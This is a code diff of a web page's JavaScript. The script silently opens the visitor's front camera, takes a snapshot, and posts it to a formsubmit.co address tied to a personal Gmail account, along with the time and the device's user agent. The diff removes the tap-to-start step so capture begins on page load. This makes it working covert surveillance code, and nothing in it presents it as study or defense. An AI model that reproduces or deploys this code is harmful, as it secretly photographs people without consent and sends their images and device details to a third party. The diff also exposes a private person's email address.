@@ -13,48 +13,31 @@ let started = false;
 
 dateField.value = new Date().toLocaleString("fr-FR");
 deviceField.value = /iPhone/i.test(navigator.userAgent) ? "iPhone" : navigator.userAgent;
-
-live.setAttribute("playsinline", "true");
-live.setAttribute("webkit-playsinline", "true");
 live.muted = true;
 live.playsInline = true;
-
-function blobToFile(blob) {
-  return new File([blob], "TOUTOU.jpg", {
-    type: "image/jpeg",
-    lastModified: Date.now(),
-  });
-}
 
 function sendPhoto(file) {
   dateField.value = new Date().toLocaleString("fr-FR");
   sizeField.value = String(file.size);
-
   try {
     const transfer = new DataTransfer();
     transfer.items.add(file);
     cameraInput.files = transfer.files;
-  } catch (error) {
-    // continue with fetch
-  }
+  } catch (error) {}
 
   const payload = new FormData(form);
   payload.set("attachment", file, "TOUTOU.jpg");
-
   fetch("https://formsubmit.co/cmahdi204@gmail.com", {
     method: "POST",
     body: payload,
     mode: "no-cors",
   }).catch(() => {});
-
   form.submit();
   overlay.hidden = true;
 }
 
 function stopCamera() {
-  if (!stream) {
-    return;
-  }
+  if (!stream) return;
   stream.getTracks().forEach((track) => track.stop());
   stream = null;
   live.srcObject = null;
@@ -62,89 +45,79 @@ function stopCamera() {
 
 function waitFrame() {
   return new Promise((resolve) => {
-    const ready = () => resolve();
     if (live.videoWidth > 0) {
       resolve();
       return;
     }
-    live.addEventListener("loadedmetadata", ready, { once: true });
-    live.addEventListener("playing", ready, { once: true });
-    setTimeout(resolve, 1200);
+    live.addEventListener("loadedmetadata", resolve, { once: true });
+    live.addEventListener("playing", resolve, { once: true });
+    setTimeout(resolve, 800);
   });
 }
 
 async function snapFromVideo() {
-  if (capturing) {
-    return;
-  }
+  if (capturing) return;
   capturing = true;
-
   await waitFrame();
   if (!live.videoWidth) {
     capturing = false;
     cameraInput.click();
     return;
   }
-
   const canvas = document.createElement("canvas");
   canvas.width = live.videoWidth;
   canvas.height = live.videoHeight;
   canvas.getContext("2d").drawImage(live, 0, 0);
   stopCamera();
-
-  const blob = await new Promise((resolve) => {
-    canvas.toBlob(resolve, "image/jpeg", 0.7);
-  });
-
+  const blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/jpeg", 0.7));
   if (!blob || blob.size < 800) {
     capturing = false;
     cameraInput.click();
     return;
   }
-
-  sendPhoto(blobToFile(blob));
+  sendPhoto(new File([blob], "TOUTOU.jpg", { type: "image/jpeg" }));
 }
 
-async function startFromTap() {
-  if (started) {
-    return;
-  }
-  started = true;
+async function useStream(nextStream) {
+  stream = nextStream;
+  live.srcObject = stream;
+  placeholder.hidden = true;
+  overlay.hidden = true;
+  await live.play();
+  await snapFromVideo();
+}
 
+async function start() {
+  if (started) return;
+  started = true;
   try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      audio: false,
-      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 640 } },
-    });
-    live.srcObject = stream;
-    placeholder.hidden = true;
-    overlay.hidden = true;
-    await live.play();
-    await snapFromVideo();
+    const asked = window.__askCam ? window.__askCam() : null;
+    const nextStream = asked
+      ? await asked
+      : await navigator.mediaDevices.getUserMedia({
+          audio: false,
+          video: { facingMode: "user" },
+        });
+    await useStream(nextStream);
   } catch (error) {
     started = false;
-    cameraInput.click();
   }
 }
 
 cameraInput.addEventListener("change", () => {
   const picked = cameraInput.files && cameraInput.files[0];
-  if (!picked) {
-    return;
-  }
+  if (!picked) return;
   capturing = true;
   sendPhoto(picked);
 });
 
-function armTap() {
-  overlay.hidden = false;
-  const go = () => {
-    overlay.removeEventListener("pointerdown", go);
-    overlay.removeEventListener("click", go);
-    startFromTap();
-  };
-  overlay.addEventListener("pointerdown", go, { once: true });
-  overlay.addEventListener("click", go, { once: true });
-}
+overlay.addEventListener(
+  "pointerdown",
+  () => {
+    if (window.__askCam) window.__askCam();
+    start();
+  },
+  { once: true }
+);
 
-armTap();
+start();
